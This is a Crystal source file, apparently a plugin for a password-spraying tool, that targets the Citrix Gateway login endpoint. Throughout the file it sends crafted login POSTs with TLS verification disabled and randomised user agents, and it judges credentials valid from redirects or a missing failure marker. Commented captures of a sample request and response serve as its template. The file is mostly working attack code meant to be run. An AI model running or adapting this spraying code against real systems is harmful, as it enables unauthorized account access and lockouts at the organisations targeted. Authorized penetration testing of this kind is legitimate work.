require "http/client"

class Citrix < Sprayer

    ## only uncomment if needed
    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) : SprayStatus
        spstatus = SprayStatus.new()
        spstatus.username = username 
        spstatus.password = password 

        # 
        # YOUR CODE BELOW 
        #

        # some basic setups for web based auth 
        url = URI.parse @target 
        #gotta set no verify for tls pages
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        # create a http client 
        client = HTTP::Client.new(url, tls: context)
        # and some basic header options
        header = HTTP::Headers{ # basic template for headers for post/get request 
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))], # uses a random header theres only 1 by default 
            "Accept" => "application/xml, text/xml, */*; q=0.01",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Content-Type" => "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin" => "https://#{url.host}",
            "Referer" => "https://#{url.host}#{url.path}", 
            "X-Citrix-Am-Labeltypes" => "none, plain, heading, information, warning, error, confirmation, image, picture-pad-table, nsg-epa, nsg-epa-failure, nsg-login-label, tlogin-failure-msg, nsg-tlogin-heading, nsg-tlogin-single-res, nsg-tlogin-multi-res, nsg-tlogin, nsg-login-heading, nsg-fullvpn, nsg-l20n, nsg-l20n-error, certauth-failure-msg, dialogue-label, nsg-change-pass-assistive-text, nsg_confirmation, nsg_kba_registration_heading, nsg_email_registration_heading, nsg_kba_validation_question, nsg_sspr_success, nf-manage-otp",
            "X-Citrix-Isusinghttps" => "Yes",
            "X-Citrix-Am-Credentialtypes" => "none, username, domain, password, newpassword, passcode, savecredentials, textcredential, webview, picture-pad, nsg-epa, nsg-x1, nsg-setclient, nsg-eula, nsg-tlogin, nsg-fullvpn, nsg-hidden, nsg-auth-failure, nsg-auth-success, nsg-epa-success, nsg-l20n, GoBack, nf-recaptcha, ns-dialogue, nf-gw-test, nf-poll, nsg_qrcode, nsg_manageotp, negotiate, nsg_push, nsg_push_otp, nf_sspr_rem", 
            "X-Requested-With" => "XMLHttpRequest", 
        } 



        # POST /p/u/doAuthentication.do HTTP/1.1
        # Host: 1.1.1.1
        # Content-Length: 144
        # Sec-Ch-Ua: 
        # X-Citrix-Am-Labeltypes: none, plain, heading, information, warning, error, confirmation, image, picture-pad-table, nsg-epa, nsg-epa-failure, nsg-login-label, tlogin-failure-msg, nsg-tlogin-heading, nsg-tlogin-single-res, nsg-tlogin-multi-res, nsg-tlogin, nsg-login-heading, nsg-fullvpn, nsg-l20n, nsg-l20n-error, certauth-failure-msg, dialogue-label, nsg-change-pass-assistive-text, nsg_confirmation, nsg_kba_registration_heading, nsg_email_registration_heading, nsg_kba_validation_question, nsg_sspr_success, nf-manage-otp
        # Sec-Ch-Ua-Mobile: ?0
        # X-Citrix-Isusinghttps: Yes
        # User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
        # Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        # Accept: application/xml, text/xml, */*; q=0.01
        # X-Citrix-Am-Credentialtypes: none, username, domain, password, newpassword, passcode, savecredentials, textcredential, webview, picture-pad, nsg-epa, nsg-x1, nsg-setclient, nsg-eula, nsg-tlogin, nsg-fullvpn, nsg-hidden, nsg-auth-failure, nsg-auth-success, nsg-epa-success, nsg-l20n, GoBack, nf-recaptcha, ns-dialogue, nf-gw-test, nf-poll, nsg_qrcode, nsg_manageotp, negotiate, nsg_push, nsg_push_otp, nf_sspr_rem
        # X-Requested-With: XMLHttpRequest
        # Sec-Ch-Ua-Platform: ""
        # Origin: https://1.1.1.1
        # Sec-Fetch-Site: same-origin
        # Sec-Fetch-Mode: cors
        # Sec-Fetch-Dest: empty
        # Accept-Encoding: gzip, deflate
        # Accept-Language: en-US,en;q=0.9
        # Connection: close
        
        # login=asdfasdfasdfas&passwd=asdfasdfasdfasdfasdfa&savecredentials=false&nsg-x1-logon-button=Log+On&StateContext=bG9naW5zY2hlbWE9ZGVmYXVsdA%3D%3D





















        form = "login=#{ URI.encode_www_form username}&passwd=#{ URI.encode_www_form password}&savecredentials=false&nsg-x1-logon-button=Log+On&StateContext=bG9naW5zY2hlbWE9ZGVmYXVsdA%3D%3D"
        # form = "username=#{username}&password=#{password}" # request form params here
        
        # here is the basic request 
        page = client.post(url.path.strip("/p/u/doAuthentication.do") + "/p/u/doAuthentication.do", headers: header, form: form) # client supporst all http verbs as client.verb -> client.get, client.delete..etc 

        #
        # logic for if valid login goes here replace whats here. it only serves as a guide for quick editing 
        # 
        # 


        # these are EXAMPLES of how to do checks 
        if page.status_code >= 300 && page.status_code <= 399 # if ok 
            puts "You got a redirect. Flagging potential username. This is unconfirmed valid"
            spstatus.valid_credentials = true 
        end

        

        if !page.body.includes? "nsg-auth-failure"
            puts "Potential xml response valid? no 'nsg-auth-failure' found in response."
            spstatus.valid_credentials = true 
        end
        
        
        # if page.body.includes? "redircting to mfa"
        #     spstatus.mfa = true 
        # end

        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        # return the SprayStatus object 
        return spstatus
    end
end







# HTTP/1.1 200 OK
# Strict-Transport-Security: max-age=157680000; preload
# Set-Cookie: NSC_VPNERR=4444;Path=/;Secure
# Set-Cookie: NSC_DLGE=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
# Set-Cookie: NSC_USER=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
# X-Content-Type-Options: nosniff
# X-XSS-Protection: 1; mode=block
# Connection: close
# Content-Length: 744
# Cache-control: no-cache, no-store, must-revalidate
# Pragma: no-cache
# Content-Type: application/vnd.citrix.authenticateresponse-1+xml; charset=utf-8
# X-Citrix-Application: Receiver for Web

 

